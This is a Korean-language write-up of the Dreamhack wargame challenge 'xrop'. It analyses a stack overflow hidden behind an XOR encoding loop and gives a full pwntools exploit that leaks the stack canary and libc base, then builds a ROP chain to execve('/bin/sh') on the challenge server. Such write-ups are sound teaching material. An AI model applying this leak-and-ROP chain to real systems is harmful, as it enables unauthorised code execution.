---
title: "xrop writeup"
date: 2026-04-02 10:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, bof, rop, canary, pie, dreamhack]
---

## Analysis

### checksec
```
root@a237909c5b9c:/pwn/xrop# checksec prob_patched
[*] '/pwn/xrop/prob_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

모든 보호 기법이 걸려 있다.

### Source Code
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-28h]
  int v5; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]
  v7 = __readfsqword(0x28u);

  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  do
  {
    printf("Input: ");
    v5 = read(0, buf, 0x100u);
    for ( i = 1; i < v5; ++i )
      buf[i - 1] ^= buf[i];
    printf("You entered: %s\n", buf);
  }
  while ( strtok(buf, "exit") );
  return 0;
}
```

## Vulnerability Analysis

BOF 취약점이 바로 보인다. 카나리와 libc base 계산을 위한 `ret` 주소를 유출하고 ROP를 하기에 충분히 여유로운 입력 크기를 받고 있다. 다만 입력의 마지막을 제외한 모든 바이트가 XOR 연산으로 덮어지기 때문에 이를 고려하여 페이로드를 작성해야 한다.

## Exploit

프로그램의 루프에서는 `buf[i-1] = buf[i-1] ^ buf[i]`를 실행한다.

`buf[i-1]`에 원하는 값 `target`을 대입하려면 다음이 성립해야 한다.

```
target = buf[i-1] ^ buf[i]
```

XOR 연산에서 `A ^ B = C`이면 `A = C ^ B`도 성립하므로, 이를 적용하면

```
buf[i-1] = target ^ buf[i]
```

따라서 페이로드를 작성할 때 `payload[i-1]`이 `target ^ payload[i]`가 되도록 하면 된다. 정순으로 접근하면 `buf[i] = target ^ buf[i-1]`을 이용하게 되는데, 마지막으로 계산된 값을 받아줄 한 칸이 더 필요하므로 페이로드 길이가 1바이트 늘어나고 그 값은 쓰레기값이 된다. 이 문제에서는 상관없지만, 역순으로 접근하면 그런 문제가 없어 더 깔끔하다.

아래는 전체 익스플로잇 코드이다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14229)
    return r

def encode_payload(data):
    arr = bytearray(data)
    for i in range(len(arr) - 2, -1, -1):
        arr[i] = arr[i] ^ arr[i + 1]
    return bytes(arr)

def main():
    r = conn()

    r.sendafter(b"Input: ", encode_payload(b"A" * 25))
    r.recvuntil(b"A" * 25)
    canary = b"\x00" + r.recvn(7)

    r.sendafter(b"Input: ", encode_payload(b"A" * 40))
    r.recvuntil(b"A" * 40)
    __libc_start_call_main = u64(r.recvn(6).ljust(8, b"\x00")) - 128
    
    libc.address = __libc_start_call_main - libc.symbols["__libc_start_call_main"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    execve = libc.symbols["execve"]

    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "pop r12", "ret"])[0]

    payload = b"\x00" * 24
    payload += canary
    payload += b"B" * 8
    payload += p64(rdi_gadget)
    payload += p64(binsh)
    payload += p64(rsi_gadget)
    payload += p64(0)
    payload += p64(rdx_gadget)
    payload += p64(0)
    payload += p64(0)
    payload += p64(execve)

    r.sendafter(b"Input: ", encode_payload(payload))
    r.interactive()

if __name__ == "__main__":
    main()
```